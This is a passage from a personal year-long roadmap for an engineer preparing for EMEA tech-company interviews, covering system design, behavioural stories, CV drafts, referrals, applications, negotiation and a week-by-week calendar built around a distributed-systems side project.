7. **An LLM API platform** — token limits, GPU scheduling, streaming, cost attribution *(the vLLM paper)*
8. **A web crawler** — frontier management, politeness, dedup at scale. **A different muscle from the mesh-shaped problems above; do this one deliberately.**

**The 45-minute structure:** 0–5 requirements (functional **and** non-functional, written on the board) · 5–10 estimation (**round aggressively, show the arithmetic**) · 10–15 API and data model · 15–25 high-level design (**state your choices as choices**) · 25–40 deep dive (where the grade is decided) · 40–45 failure modes and 10x.

> **The single highest-leverage habit: say the words "I'm optimising for X, which costs me Y." Every time.**

**Numbers to memorise:**
```
1 machine:  ~10-50k QPS simple requests · 64-256GB RAM · 10-40 cores
Postgres:   ~5-50k simple QPS · ~1-5k writes/s with fsync
Redis:      ~100k-1M ops/s single instance (single-threaded!)
Kafka:      ~100k-1M msg/s per broker (small, batched)
NVMe:       ~500k-1M IOPS · 3-7 GB/s        Network: 10 Gbps = 1.25 GB/s
RTT:        same-AZ ~0.3-0.5ms · cross-region 30-150ms
Time:       1 day ≈ 10^5 s · 1M req/day ≈ 12 QPS · 1B req/day ≈ 12k QPS
```

> **🔴 Your unusual advantage.** Most candidates answer system design from books. **You can answer from a system you built, operated, and broke twenty times on purpose.** Asked to design a job scheduler, don't recite — say *"I did this; here's what I chose and here's the number I measured."* **Practise that move in the W44 mock**, because it does not happen naturally under pressure.

## The behavioural round

At Amazon this is ~50% of the loop. **Everywhere it is a real, scored, failable round**, and strong technical candidates fail it constantly by treating it as small talk.

**Fourteen stories in STAR-L** (Situation, Task, **Action — 60% of the words, "I" not "we"**, Result **with a number**, Learning), written by Week 44. **Your material this year is unusually good:**

| # | Prompt | Your story |
|---|---|---|
| 1 | A technically hard problem | The Raft Figure 8 case, or the colluding-liars threshold |
| 2 | **Finding a serious problem in your own work** | 🔴 **Coordinated omission in your own harness (W28). Your best story** — it shows the scepticism about your own results that senior engineers are selected for |
| 3 | Being wrong and changing course | Naive majority-of-three, broken by your own simulator before you finished writing it |
| 4 | A failure | The level where your estimate was most wrong, **with the ratio from `RETROSPECTIVE.md`** |
| 5 | Shipping under a hard constraint | Zero budget forcing the ARM port and the 24GB memory ceiling on hot-swap |
| 6 | An incident | **Clock skew — green dashboards, wrong decisions, nothing alerting** |
| 7 | A decision with incomplete information | DHT choice, or region size |
| 8 | Pushing back / saying no | **No blockchain.** You were building a compute marketplace and deliberately didn't add a token. |
| 9 | Learning something new fast | TLA+, or NAT traversal |
| 10 | Improving something unasked | The `crashdb` torture harness |
| 11 | Proudest achievement | The trust curve |
| 12 | Mentoring / unblocking | The peer runbook test (W47) and the four gaps it exposed |
| 13 | Disagreeing with a senior person | Use a real one from Logic Leap |
| 14 | **Something from Logic Leap** | 🔴 **Do not let the side project eclipse your paid work.** Interviewers notice. |

**The rules that decide the score:** numbers always · **"I" not "we"** · the Learning is not optional · **90 seconds then stop** · Amazon maps each to a Leadership Principle and **drills with follow-ups that catch fabricated stories — use real ones.**

**Practice:** record all 14 on video. Watch them back. Then 5 mock behavioural rounds with a human.

## 📈 TRACK I EXIT CRITERIA
- [ ] 700+ problems, **≥70% solved unaided within 25 minutes**
- [ ] A random unseen Medium, **narrated**, in ≤25 min, ≥80% of the time
- [ ] Complexity stated before code, every time
- [ ] 20+ Hard problems · **failure-log review queue empty** · Codeforces ≥1750
- [ ] **12+ full timed loops** · 8 system designs as docs + 20 practised · 14 behavioural stories on video

---
---

# 🧭 TRACK J — Craft, Career & Visibility

> What separates an L4 from an L5 is not knowing more systems facts. It's **judgement, communication and impact beyond your own keyboard.**
> **5h/week, 6h from Week 40. One artifact every two weeks.**

## J.1 — Design docs and ADRs

**The design doc is the unit of senior technical work.** Promotion at every large company is decided by written artifacts.

```markdown
# [Title]                    **Author** · **Status** · **Date**
## 1. Summary            3 sentences. A reader should be able to stop here.
## 2. Context & Problem  What exists, what's broken — WITH DATA. Graphs, numbers, incident links.
## 3. Goals              Bulleted, measurable.
## 4. Non-Goals          Explicit. Where scope creep dies. The most under-used section.
## 5. Proposal           Design. Diagrams. Data model. Sequence for the critical paths.
## 6. Alternatives Considered   ← THE SECTION THAT DISTINGUISHES SENIOR WRITING
                         Minimum three. "Do nothing" is always one of them.
## 7. Risks & Failure Modes     Blast radius. Detection. Mitigation.
## 8. Rollout Plan       Phases. Flags. ROLLBACK AT EVERY STEP.
## 9. Operational Impact Monitoring, alerts, runbook, on-call burden, cost.
## 10. Open Questions
```

**The two sections that separate senior from mid: *Alternatives Considered* and *Non-Goals*.** A doc without a serious alternatives section reads as advocacy, not engineering.

**Already scheduled:** `threat-model.md` (W4) · `durability-contract.md` (W12) · `sharding-regions.md` (W27) · `trustless-observability.md` (W30) · `delivery.md` (W31) · `trust-model.md` (W33) · `gcp-window.md` (W34) · `slo.md` (W35) · `exactly-once.md` (W22) · `isolation-level.md` (W44). **Ten, plus ten ADRs in W50.**

## J.2 — Writing and visibility — the multiplier

**Post the results, not the progress.** Not "day 47 of my coding journey" — the findings. You will have unusually good ones:

| Week | The post | Why it travels |
|---|---|---|
| 13 | **"I killed my storage engine a thousand times and injected fsync failures at the syscall level"** | The torture harness, and the fsyncgate lesson |
| 17 | 🔴 **"Chord vs Kademlia under 30% churn: the benchmark nobody published"** | **A genuinely missing comparison. This is a front-page candidate.** |
| 22 | **"Where I put consensus in a peer-to-peer mesh, and why not everywhere"** | The DHT/Raft layering argument |
| 26 | 🔴 **"Three bugs in my distributed system that no test suite would have caught"** | DST + the colluding-liars seed. **Front-page candidate.** |
| 28 | 🔴 **"I found coordinated omission in my own benchmark harness and re-measured six months of results"** | **Engineers at exactly your target companies will read this.** |
| 30 | **"Observability in a system with no trusted centre"** | Genuinely novel framing; almost nobody writes about this |
| 35 | 🔴 **"How much redundancy do you need to trust a stranger's computer? The curve."** | **The artifact. BOINC has done this for 20 years and nobody published the tradeoff.** |
| 42 | 🔴 **"The seven mechanisms behind every major outage"** — from six local reproductions | Broadly useful, highly shareable |

Own the domain; cross-post to Hacker News, Lobsters, and the relevant subreddit. **One post reaching the HN front page generates more inbound recruiting than 200 applications.**

**Give one talk.** A Cairo meetup counts. Explaining the trust curve out loud will expose every gap in your understanding, which is why it's valuable.

## J.3 — Open source

**A merged PR into a project people have heard of beats three personal projects**, because someone with commit rights judged your code good enough to ship.

**The ladder:** use it seriously → fix the docs where they confused you (gets you through the CLA/CI process once) → a `good first issue` → **a bug you personally hit** → **a bug found by fuzzing** (maintainers love a minimal reproducer) → a feature, after discussing design in an issue first.

**Highest-leverage targets given SWARM:** **libp2p** (Go implementation — directly your problem domain, and you will hit real bugs) · **Wasmtime** (you'll use it hard and hit edges) · **HashiCorp memberlist** (the production SWIM implementation) · **etcd/raft**. **One meaningful PR to libp2p is worth twenty to Kubernetes**, because the maintainers will know your name. **Budget: Levels 7–9, inside the Track J block. Target: 3+ merged, one non-trivial.**

## J.4 — 🔴 The referral problem, and how to solve it from Egypt

**Harder than the degree question.** A cold application from Cairo to a Dublin req competes with hundreds of in-region applicants needing no sponsorship. **A referred application is read by a human. A cold one frequently is not.**

**The mistake:** waiting until Week 40 and messaging strangers for referrals. A referral is someone putting their reputation on your application. **Nobody does that for someone who appeared in their inbox last Tuesday.**

### ⏰ The pipeline opens Week 18. That's what the Track J hours are for through Levels 5–9.

**Channel 1 — the Egyptian engineering diaspora. Highest return.** Substantial numbers at Google Dublin and Zurich, Meta London, Amazon Dublin, Microsoft. Find them via LinkedIn alumni search on your university, then other Egyptian universities, filtered by company. **They were where you are. They are disproportionately willing to help and disproportionately under-asked, because most people are too embarrassed to reach out.**

Not "can you refer me":

> I'm a backend engineer in Cairo building an open peer-to-peer compute mesh — job execution in WASM sandboxes, Kademlia for placement, Raft for assignment within regions. I'm working on the verification layer now, and I'd value fifteen minutes of your view on [one specific technical question you genuinely have]. No obligation and no ask beyond that.

Then have the conversation, be interesting, follow up two months later with what you built. **The referral, if it comes, comes on its own.** **Target: 3 conversations/month from Week 18. By Week 40 that's 15–18 people who know what you're building.**

**Channel 2 — build in public** (§J.2). **Channel 3 — OSS** (§J.3). **Channel 4 — the technical report** (W43); most candidates have a GitHub link, **a 20-page report with benchmarks and an honest limitations section is a different object and it gets forwarded.** **Channel 5 — meetups and CFPs**; submit the trust-curve talk in Level 11 for 2028. The CFP is networking even when rejected.

**The direct ask, Week 40, to people you've known for months:**

> I'm applying to [specific role, specific office] this week. Here's the project [link] and my CV. If you're comfortable referring me I'd be grateful; if not, no problem at all — and I'd still value knowing whether the CV reads clearly to someone inside.

**The second half matters.** It gives them an out that isn't a rejection, and it frequently produces useful feedback from people who won't refer you.

## J.5 — Target companies

Applications go to **specific offices**, not "Google."

| Company | Offices | Note |
|---|---|---|
| **Google** | Dublin, Zurich, London, Munich, **Warsaw** | Zurich strongest and hardest. **Warsaw more accessible.** |
| **Meta** | London, Dublin | London is the main EMEA engineering site |
| **Amazon / AWS** | Dublin, London, Berlin, Luxembourg | Most reqs, **most accessible tier-1 entry.** AWS infra roles map onto Levels 7–8 |
| **Microsoft** | Dublin, London, Cambridge, Munich, **Cairo** | 🔴 **The only tier-1 on this list with engineering in Cairo. Apply there in Week 40 regardless** — a local tier-1 role is a legitimate route to an internal transfer |
| **Stripe** | Dublin, London | Backend-heavy, **values written communication — your report and ADRs are unusually well-matched** |
| **Datadog** | Paris, Dublin | **Your Level 7 trustless-observability work is their product domain** |
| **Cloudflare** | London, Lisbon | Network and systems heavy. **Your NAT traversal, gossip and QUIC work is directly relevant** |

**Second tier, same practice, easier entry:** Databricks (Amsterdam) · Snowflake (Berlin/Dublin) · Elastic (Amsterdam) · Confluent (London) · MongoDB (Dublin) · HashiCorp (**Consul is SWIM in production — you will have implemented their problem**) · **Grafana Labs** (remote-first; observability) · Bloomberg (London, large C++) · **Protocol Labs / Filecoin ecosystem** (**IPFS and libp2p are literally your project's neighbours — the fit here is exceptional**) · **Temporal** (durable execution — adjacent) · **Canonical** (fully remote, hires globally, heavy systems interviews).

**Calibration tier** (W30–39, no cooldown risk): Instabug, Swvl, Halan, Paymob, MaxAB (Cairo); Careem, Talabat, Tabby (Gulf); any European startup with a real systems interview.

## J.6 — CV versions

**One page. Every line traceable to something in the repo the day you write it.**

**Structure** — with ~2 years' experience and a non-CS degree:
1. Name, GitHub, **"Cairo, Egypt · open to relocation · requires EU/UK sponsorship"**
2. Two-line summary
3. 🔴 **SELECTED PROJECT — SWARM, 5–7 bullets. The largest section, ABOVE employment.**
4. Experience — Logic Leap, 3–4 bullets, quantified
5. Skills — Python, C++, Go + infrastructure, **keyword-matched to the corpus**
6. **Education — one line, last.**

> **The degree line:** *"BSc Management Information Systems, [University], [year]."* **No parenthetical. No "(self-taught in CS)". No apologetic adjective.** The project section made the argument; restating it next to the degree draws attention to the anxiety rather than the evidence.

**Every bullet is X-Y-Z:** *"Accomplished [X] as measured by [Y], by doing [Z]."*

**CV v1 — W13** *(not for applying; exists so an unexpected opportunity doesn't find you writing a CV in a panic)*
> **SWARM — peer-to-peer distributed compute mesh** · C++, Go, Python · [repo]
> · Built a WASM-sandboxed executor for untrusted third-party code with fuel metering, capability isolation and cgroup backstops; verified bit-identical output across 100 runs, the determinism property the verification layer depends on.
> · Implemented SWIM gossip membership and phi-accrual failure detection; membership traffic per node is flat as the mesh grows, against O(N²) for naive all-pairs pinging.
> · Built a crash-tested storage engine with a torture harness performing 1,000 kill cycles and syscall-level `fsync`/torn-write fault injection, zero invariant violations.

**CV v2 — W25**
> · Implemented Chord and Kademlia DHTs and **benchmarked them head-to-head under 30% simultaneous churn** — hop counts, lookup success and maintenance traffic — a comparison not previously published on one testbed.
> · Implemented Raft for region-level job assignment; a leader killed mid-commit under load loses and duplicates zero assignments.
> · Built a deterministic simulation harness running 10,000 seeded fault schedules nightly, **including Byzantine nodes returning plausible-but-wrong results**; found 3 correctness bugs no conventional test caught, each reproducible from a seed integer.

**CV v3 — W34** *(the first version that survives a tier-1 screen — send to your three strongest contacts for feedback, not for referral)*
> · **Built a redundant-execution verification layer and measured the trust/redundancy/cost tradeoff curve** — required replication vs probability of accepting an incorrect result, across liar fractions and reputation histories. Published; no equivalent measurement exists publicly.
> · Held mesh goodput at **Y% of capacity under 5x offered load** via deadline-aware shedding and adaptive concurrency limits, against X% for the naive scheduler.
> · Deployed across Oracle Cloud (ARM) and AWS at **$0/month**; ported and re-benchmarked the C++ core for aarch64 and published the per-component delta. Full stack in Terraform; CI authenticates via OIDC with zero long-lived credentials.

**CV v4 — W40** *(the one you apply with)*
> · Extended the mesh to model inference as a routed job type with continuous batching, prefix caching (**≥40% measured cost reduction**), streaming with propagated cancellation, and content-hash-keyed billing that survives executor death mid-generation without double-charging.
> · Ran a chaos programme: **20+ injected incidents** (asymmetric partition, leader kill mid-commit, clock skew, Byzantine peers) each with alerting, root cause and a runbook; separately reproduced 6 famous public outages locally with verified fixes.

## J.7 — Applications

| Weeks | Volume | Targets |
|---|---|---|
| 30–39 | 2–3/month | **Calibration tier only** |
| 40–43 | 12/week (48) | **Tier-1 EMEA first:** Dublin, London, Amsterdam, Munich, Warsaw, Zurich |
| 44–47 | 12/week (48) | Remaining tier-1, second tier, **Protocol Labs, Temporal, HashiCorp, Grafana** |
| 49–52 | 8/week | Fill gaps; the pipeline is mostly conversion now |

**≈150 applications.** Fewer than 100 under-samples a noisy process; more than 250 is applying without targeting.

**Every application logged** in `career/APPLICATIONS.md` — date, company, office, role, referral (y/n, by whom), response, stage, outcome. **You need this to compute response rate and stage conversion, and you cannot reconstruct it later.**

**Sequence your loops:** 3–4 companies you care less about *first*. Your fifth loop is dramatically better than your first. **Then overlap the real ones so offers arrive within ~2 weeks** — competing offers are the only real leverage.

> **On expected response rates: I have no corpus number and won't invent one.** Structurally: **a referred application is read by a human; a cold one from Egypt to a Dublin role frequently is not.** That asymmetry is the entire reason §J.4 exists.

### 🚨 If the response rate is low (checked W43, ~48 out)
**Below 10%, stop and diagnose before sending more with the same CV.** In order:
1. **Targeting** — reqs wanting 5+ years won't respond regardless. Check the level distribution.
2. **Sponsorship filter** — some reqs auto-reject sponsorship needs. **Invisible, and not about you.**
3. **The top third of the CV** — recruiters read the top third. If it doesn't contain **distributed systems (44.5%), Kubernetes (29.7%), AWS (33.6%), Go (35.9%), Python (44.5%), scalability (27.3%)**, it's miscalibrated. **The DHT and consensus work is interview content; the top of the CV is screening surface.**
4. **Referral ratio** — under a third referred? The fix is §J.4, not more applications.

**Fix in Week 44. Do not respond to a low response rate by increasing volume** — that converts a fixable problem into a burned target list.

## J.8 — Negotiation

Weeks 50–52. **The highest hourly-rate work you will ever do.**
1. **Never give a number first**, including on the recruiter's first call. *"I'd like to focus on whether this is the right fit; I'm confident we can align on compensation"* is a complete answer and it's expected.
2. **Competing offers are the only real leverage.** Hence overlapping loops.
3. **Negotiate the whole package:** base · equity **and its vesting schedule** · sign-on (most flexible) · **level — worth more than any of the above over three years** · start date.
4. 🔴 **Applying from Egypt to a European role creates an anchoring risk.** Recruiters may benchmark against Egyptian salaries. **Do not accept that framing** — compensation is for the role in that location. Know your target level's `levels.fyi` number for that company and office **before the first call.**
5. **Read: Haseeb Qureshi, "Ten Rules for Negotiating a Job Offer."** Plausibly a five-figure return for two hours.
6. Be gracious. You will work with these people.

## J.9 — What the loops look like (verify with your recruiter)

| Company | Loop |
|---|---|
| **Google** | Phone screen → onsite: 2–3 coding, 1 system design, 1 Googleyness & Leadership. Then **hiring committee and team matching** — a strong loop can stall at team match. **Normal, not a rejection.** |
| **Meta** | Phone screen (**2 problems in 45 min — speed matters more here than anywhere**) → 2 coding, 1 system design, 1 behavioural |
| **Amazon** | OA → 4–5 rounds, **every round includes Leadership Principle questions.** The **Bar Raiser** is external to the team with veto power |
| **Microsoft** | Coding + design + an "as appropriate" round with a senior leader |
| **Stripe / Datadog / Cloudflare / HashiCorp** | **Practical over puzzle:** debugging unfamiliar code, extending real code, an integration exercise, plus system design. **This roadmap prepares you unusually well for these.** |

**Leveling:** L3/E3 (new grad) → **L4/E4 (2–5 yrs)** → **L5/E5 (5+ yrs, owns ambiguous projects end-to-end — where system design decides it).** **Interview for the level your evidence supports.** Down-levelling is common; being under-levelled costs years of compensation, so push back with evidence if the loop went well.

---
---

# 📅 The 52-Week Calendar

**Standard week: 30h = 18 Depth / 7 Interview / 3 Fundamentals / 2 Craft.**
**From W40: 30h = 12 Depth / 12 Interview / 6 Career.**

**Budget:** 52 × 30 = 1,560 nominal. −80 (4 rest weeks at 10h) −30 (Ramadan W23–25 at 20h) −8 (two Eid weeks at 26h) +4 (W22 pull-forward at 34h) = **≈ 1,446 effective hours.**

| Track | Hours | Share |
|---|---|---|
| Depth (SWARM + flagships) | ~840 | 58% |
| Interview | ~340 | 24% |
| Fundamentals | ~145 | 10% |
| Craft & Career | ~121 | 8% |

⚠️ **Four weeks exceed budget: W3, W17, W31, W40.** Each has a stated cut line. **Do not compress estimates — drop the task.**

| Wk | Starts | Lvl | Depth focus | Milestone / Flagship | I | F | J | Tot |
|---|---|---|---|---|---|---|---|---|
| 1 | 2026-09-07 | 0 | Repo, CI, toolchains, `latency-lab` | — | 7 | F1 3 | C1 2 | 30 |
| 2 | 09-14 | 0 | **🔴 SCALE RISK: how many nodes fit? NAT to Oracle?** `bench/`, `sickbay` | `SCALE-RISK.md` **go/no-go** | 7 | F1 3 | 2 | 30 |
| 3 | 09-21 | 1 | **Attack the naive executor 4 ways.** WASM sandbox, fuel, cgroups | — | 7 | F2 3 | 2 | **33** ⚠ |
| 4 | 09-28 | 1 | Durable job log, resource accounting, **determinism test**, threat model | **S0** | 7 | F2 3 | 2 | 30 |
| 5 | 10-05 | 2 | `c10k-arena` — six concurrency models | — | 7 | F3 3 | 2 | 30 |
| 6 | 10-12 | 2 | **SWIM gossip**, phi-accrual failure detection | — | 7 | F3 3 | 2 | 30 |
| 7 | 10-19 | 2 | **NAT traversal, hole punching, relay.** `swarm-relay` on Oracle | — | 7 | F4 3 | 2 | 30 |
| 8 | 10-26 | 2 | Wire protocol, codec, versioning, job submission gateway | — | 7 | F4 3 | 2 | 30 |
| 9 | 11-02 | 2 | **Asymmetric partition test.** Convergence + false-positive measurement | **S1** | 7 | F4 3 | 2 | 30 |
| 10 | 11-09 | 3 | **`crashdb`** — WAL, CRC framing, compaction, Bloom | — | 7 | F5 3 | 2 | 30 |
| 11 | 11-16 | 3 | **Torture harness** + `LD_PRELOAD` fault injection · **hexagonal refactor** | **#1 · S2** | 7 | F5 3 | 2 | 30 |
| 12 | 11-23 | 3 | **Content addressing, CDC chunking, Merkle DAG, GC** | **S3** | 7 | F5 3 | **CV v1** 2 | 30 |
| 13 | 11-30 | — | 🛌 **REST** — exit check, checkpoint, **failure-category count** | — | 6 | — | 2 | 10 |
| 14 | 12-07 | 4 | Consistent hashing, vnodes, bounded loads | — | 7 | F6 3 | 2 | 30 |
| 15 | 12-14 | 4 | **Chord** — finger tables, stabilisation, join/leave | — | 7 | F6 3 | 2 | 30 |
| 16 | 12-21 | 4 | **Kademlia** — XOR metric, k-buckets, parallel lookup | — | 7 | F7 3 | 2 | 30 |
| 17 | 12-28 | 4 | **`dht-arena`** — the churn benchmark, both, one testbed | **#2 · S4** | 7 | F7+F8 3 | 2 | **33** ⚠ |
| 18 | 2027-01-04 | 5 | Raft: elections, log replication | **🤝 REFERRALS OPEN** | 7 | F8 3 | 2 | 30 |
| 19 | 01-11 | 5 | Raft: **Figure 8**, commit rules, membership changes | — | 7 | F9 3 | 2 | 30 |
| 20 | 01-18 | 5 | Raft: ReadIndex, seeded test harness, 1000-run election test | **#3** | 7 | F9 3 | 2 | 30 |
| 21 | 01-25 | 5 | **`swarmd/region`** — Raft over the DHT · **🎯 Figure 8 whiteboard test + first human mock** | — | 7 | F9+F10 3 | 2 | 30 |
| 22 | 02-01 | 5 | 🔧 **BUFFER + pre-Ramadan pull-forward:** watch Will Wilson, read FDB §4, learntla setup, fencing tokens | **S5** | 7 | F10 — | 2 | **34** |
| 23 | 02-08 | 6 | 🌙 `SimClock`, `SimNetwork`, `SimDisk` | — | 5 | F11 2 | 3 | **20** |
| 24 | 02-15 | 6 | 🌙 `SimScheduler`, **`LyingNode`**, invariant checker | — | 5 | F11 2 | 3 | **20** |
| 25 | 02-22 | 6 | 🌙 10k seeds, **find ≥3 bugs**, TLA+ on the verification protocol | **#4 · S6** | 5 | F11 2 | **CV v2** 3 | **20** |
| 26 | 03-01 | — | 🛌 **REST** — **🚩 HALF-YEAR GATE**, half-year retrospective, category count | — | 5 | — | 3 | 10 |
| 27 | 03-08 | 7 | 🌙 Eid. **Placement: 6 strategies, resource-vector packing** | — | 6 | F14 2 | 1 | **26** |
| 28 | 03-15 | 7 | **`overload`** — the goodput curves · **🔴 F12 harness audit** | **#5** | 7 | F12 3 | 2 | 30 |
| 29 | 03-22 | 7 | Retry budgets, metastable failure, `gatekeep` mTLS | — | 7 | F13 3 | 2 | 30 |
| 30 | 03-29 | 7 | **k8s: 30-node mesh, trustless observability** · **first calibration applications** | **S7** | 7 | F13+F14 3 | 2 | 30 |
| 31 | 04-05 | 8 | **`trustcurve`** — redundant execution, majority vote, collusion threshold | — | 7 | F15 3 | 2 | **33** ⚠ |
| 32 | 04-12 | 8 | Reputation model, sleeper attack, **THE CURVE** | **#6** | 7 | F15 3 | 0 | 30 |
| 33 | 04-19 | 8 | Multi-tenancy, shuffle sharding · **Oracle deploy, aarch64 port** | — | 7 | F16 3 | 2 | 30 |
| 34 | 04-26 | 8 | `costwatch`, GCP window, **🔴 `sim-fidelity.md`** | — | 7 | F16 3 | **CV v3** 3 | 30 |
| 35 | 05-03 | 8 | 🔧 **BUFFER** + SLOs + load test · **🚩 TWO-THIRDS GATE** | **S8** | 7 | — | 3 | 30 |
| 36 | 05-10 | 9 | Inference as a job type, capability advertisement, batching | — | 7 | — | 2 | 30 |
| 37 | 05-17 | 9 | 🌙 Eid al-Adha. Prefix caching, streaming, cancellation | — | 6 | — | 1 | **26** |
| 38 | 05-24 | 9 | **Peer death mid-generation without double-billing** · **LOOP #1** | **#7 · S9** | 7 | — | 2 | 30 |
| 39 | 05-31 | — | 🛌 **REST** — **application-readiness gate**, **Final Gauntlet**, category count | — | 5 | — | 2 | 10 |
| 40 | 06-07 | 10 | **🎯 CV v4 · FIRST 12 APPLICATIONS · referral activation** · chaos framework | — | 12 | 0 | 8 | **33** ⚠ |
| 41 | 06-14 | 10 | **`incident-lab`** pt1: 10 incidents + **clock skew** + **relay SPOF** · **LOOP #2** | — | 12 | 0 | 6 | 30 |
| 42 | 06-21 | 10 | pt2: 20 total, 6 famous outages, **the seven-mechanisms essay**, report draft | **#8** | 12 | 0 | 6 | 30 |
| 43 | 06-28 | 10 | 🔧 **BUFFER** + report finished + **🚨 response-rate gate** | — | 12 | 0 | 6 | 30 |
| 44 | 07-05 | 11 | Public API, OpenAPI, versioning, pagination, metadata store · **LOOP #3** | — | 12 | 0 | 6 | 30 |
| 45 | 07-12 | 11 | **`pgshift`** — 50M-row migration under live load · **LOOP #4** | — | 12 | 0 | 6 | 30 |
| 46 | 07-19 | 11 | Dashboard: 2,000 WebSockets, backpressure, jitter · **LOOP #5** | — | 12 | 0 | 6 | 30 |
| 47 | 07-26 | 11 | `admin` + **runbook tested by a peer** + supply-chain hygiene · **LOOP #6** | **S10** | 12 | 0 | 6 | 30 |
| 48 | 08-02 | — | 🛌 **REST** — interview prep only, pipeline review, category count | — | 6 | — | 4 | 10 |
| 49 | 08-09 | 12 | **README final, TOUR.md, benchmarks final** · **LOOPS #7–8** | — | 14 | 0 | 6 | 30 |
| 50 | 08-16 | 12 | **10 ADRs · LIMITATIONS.md · COMPARISON.md** · **LOOPS #9–10** | — | 14 | 0 | 6 | 30 |
| 51 | 08-23 | 12 | **RETROSPECTIVE.md** + talk/post · **LOOP #11** | — | 14 | 0 | 6 | 30 |
| 52 | 08-30 | 12 | Final state, re-record the talk, **`docs/NEXT.md`** · **LOOP #12** | **S11** | 14 | 0 | 6 | 30 |

### Cut lines for the over-budget weeks
- **W3 (33h):** drop the `curl`-exfiltration attack to a written analysis rather than a live reproduction (−2h). **Do not cut the determinism test** — Level 8 dies without it.
- **W17 (33h):** the DHT benchmark drops from 4 churn levels to 3 (−2h). **Do not cut the head-to-head comparison** — it is the flagship.
- **W31 (33h):** the reputation model ships v1 only, with the sleeper test moving to W32 (−3h). **Do not cut the collusion threshold** — your own simulator already proved you need it.
- **W40 (33h):** `docs/design/stochastic-budget`-equivalent items slip a week (−2h). 🔴 **The application tasks CANNOT be cut.** If you cut them, the Week-40 decision never actually happens and you find yourself applying in Week 50 with no pipeline.

---
---

# 📊 ASSESSMENT: The Three Proofs

You do not "finish" a level. You **prove** it, three ways.

| Proof | What | Why |
|---|---|---|
| **1. The Exam** | The written questions at the level's end, no notes, timed | Retrieval under pressure — the interview condition |
| **2. The Artifact** | The project, exit criteria met, **numbers published** | That you can actually build it |
| **3. The Teach-Back** | **Explain the level's hardest concept to a camera in 10 minutes, no notes, with a diagram** | **The strictest test there is. You cannot fake teaching.** |

**Fail any of the three and the level is not done.** This is the discipline that separates someone who "went through" a roadmap from someone who is dangerous.

## The Final Gauntlet — one week, Week 39, before your first real loop

| Day | Challenge | Pass condition |
|---|---|---|
| 1 | 4 LeetCode Mediums + 1 Hard, timed, **narrated aloud, recorded** | 4/5 unaided within time |
| 2 | 2 system designs, 45 min each, on video, **cross-checked against Xu Vol 1/2's own frameworks** | Both hit the rubric |
| 3 | **Debug a sabotaged SWARM** — have a peer break it without telling you what | Root cause in <45 min **with evidence** |
| 4 | All 14 behavioural stories on video, cold | Each ≤90s, quantified, first person |
| 5 | Write a full design doc for a **novel** problem in 3 hours | All 10 sections, **3+ real alternatives** |
| 6 | **Teach-back: Raft's Figure 8 · the trust/redundancy curve · deterministic simulation testing.** 10 min each | No notes, correct, with diagrams |
| 7 | Watch every video from days 1–6 and **grade yourself against the rubrics** | Honest scoring |

**Pass = ready to interview. Fail any day → that's your next two weeks.**

## The spaced-repetition deck

**One card per non-obvious fact, written by you.** Downloaded decks don't work; cards you write do. Target ~600. Categories: latency numbers · isolation-level anomalies · Raft rules · DHT hop bounds · algorithm complexities · Linux commands and what they *answer* · failure modes · estimation constants · **your own measured numbers.**

**15 min/day, non-negotiable.** The difference between knowing something in month 3 and knowing it in month 12 when the interview happens.

---
---

# 📈 TRACKING & RE-PLANNING

Three artifacts, three rituals, ~45 min/week. **If it costs more, cut it down rather than abandoning it** — a degraded log you keep beats a perfect log you stop.

| File | Contains | Written |
|---|---|---|
| `LOG.md` | Hours by track, task outcomes, weekly review, monthly checkpoint | Daily + Sunday |
| `dsa/FAILURES.md` | Every failed problem, in the §XI format | As it happens |
| `career/APPLICATIONS.md` | Every application, with response and stage | As it happens |

## Daily — 2 minutes
```
2026-09-23 · D:4.0 I:1.5 F:0 J:0 · WASM fuel metering working; cgroup backstop started
             (wasmtime C API docs thinner than expected, cost ~1h)
```
**Log the hours you actually worked, not the hours you sat at the desk.** The Week-51 retrospective is only useful if this is honest, and its value is telling you your real estimation ratio — which you cannot learn from inflated data.

## Weekly review — Sunday, 30 minutes

1. **Hours by track vs budget.** A deficit up to 3h is noise. **Three consecutive deficit weeks is a signal.**
2. **Which tasks met their acceptance criterion?** Met / not met. **"Partially" is not a category — force it.** A benchmark that runs but has no hardware counter **did not meet its criterion.**
3. **Which targets did you set before measuring, and what did you get?** **Both numbers, always.**
4. **What didn't finish, and does it block next week?** Blocks → top of next week, something drops. Doesn't → the buffer list for W22/W35/W43. **Never silently carry unfinished work forward** — that's how a two-week slip becomes invisible until month eight.
5. **Interview track:** attempted / solved / failed / re-solved. **15 attempted and 0 failure entries means the problems were too easy or you're not logging.**
6. **One sentence: the biggest risk to the next four weeks.** A specific thing, not a feeling.

## Monthly checkpoint — at each level boundary

1. **Level exit criteria, one at a time. Met, or waived in writing with a reason. No third option.**
2. **Hours: month actual vs budget, and cumulative.** The cumulative number is the one that matters.
3. 🔴 **Is the repository interview-ready RIGHT NOW?** Three checks, *performed*:
   - Does `make bootstrap` work on a clean clone? **Actually run it.**
   - Does the README describe what exists rather than what's planned?
   - **Can you speak for 45 minutes about it, today, without preparation?**

   If any is no, fixing it is next week's top priority. **The plan is built so you can stop at any week and still be a coherent candidate, and this check is the only thing enforcing it.**
4. **The six corpus gaps** — AWS 33.6%, K8s 29.7%, Scalability 27.3%, Observability 20.3%, On-call 16.4%, Kafka 10.9%. One line each: closed / in progress / not started, **and what the evidence is. Not what you read. What is running.**
5. 🔴 **Failure-category count** from `dsa/FAILURES.md`. **The most valuable twenty minutes in the checkpoint, and the one most likely to be skipped.**
6. **From Week 18:** referral pipeline — conversations this month, people who now know what you're building, people who would plausibly refer you.
7. **From Week 40:** applications sent, responses, response rate, stage conversion, what's stalled.
8. **One paragraph: is the plan still right?** Not "am I on schedule" — whether it still describes the correct work.

## 🚨 Re-plan triggers

**Re-planning is not failure; it is the plan working.**

| Trigger | Response |
|---|---|
| **Cumulative deficit > 40h** | **Cut scope, do not compress estimates.** Cut order: (1) Chord (ship Kademlia only, and say why in the ADR), (2) the second reputation iteration, (3) the dashboard's polish, (4) `pgshift`. |
| **All buffer weeks gone before W35** | Estimates are systematically wrong. **Recompute Levels 9–12 with your measured ratio from `LOG.md`**, and **seriously consider the Extended Track.** |
| **Two consecutive checkpoints where the repo isn't interview-ready** | **Stop feature work entirely for one week.** README, build, demo. Overrides everything. |
| **Three consecutive weeks of Interview track under 5h** | The project is eating the track you explicitly protected. **Invert the week: interview first, project with what's left, for two weeks.** |
